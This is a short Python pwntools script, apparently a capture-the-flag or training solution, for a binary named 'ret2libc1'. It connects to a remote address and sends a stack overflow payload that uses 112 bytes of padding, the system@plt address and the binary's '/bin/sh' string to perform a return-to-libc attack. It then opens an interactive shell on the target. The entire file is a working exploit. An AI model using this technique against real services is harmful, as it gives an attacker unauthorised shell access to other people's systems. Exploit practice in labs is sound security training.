from pwn import *


def ret2_libc1_3(file_name='/mnt/hgfs/CyberSecurity/pwn2/ret2libc1'):
    elf = ELF(file_name)
    io = remote("172.53.6.16", 10000)

    system_plt = p32(elf.plt['system'])
    bin_sh_str = p32(next(elf.search(b'/bin/sh')))

    payload = b'A' * 112

    payload += system_plt + b'A' * 4 + bin_sh_str

    io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    ret2_libc1_3()
